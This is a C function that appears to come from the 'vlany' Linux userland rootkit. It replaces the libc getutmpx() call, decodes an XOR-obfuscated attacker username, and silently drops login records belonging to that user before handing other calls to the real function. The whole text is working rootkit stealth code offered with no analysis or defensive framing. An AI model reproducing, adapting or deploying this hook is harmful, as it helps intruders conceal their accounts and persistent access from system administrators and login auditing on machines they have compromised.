void getutmpx(const struct utmp *ut, struct utmpx *utx)
{
    #ifdef DEBUG
        printf("[vlany] getutmpx() called\n");
    #endif

    if(ut && ut->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(ut->ut_user, vlany_user)) { CLEAN(vlany_user); return; }
        CLEAN(vlany_user);
    }

    HOOK(old_getutmpx, CGETUTMPX);
    old_getutmpx(ut, utx);
}
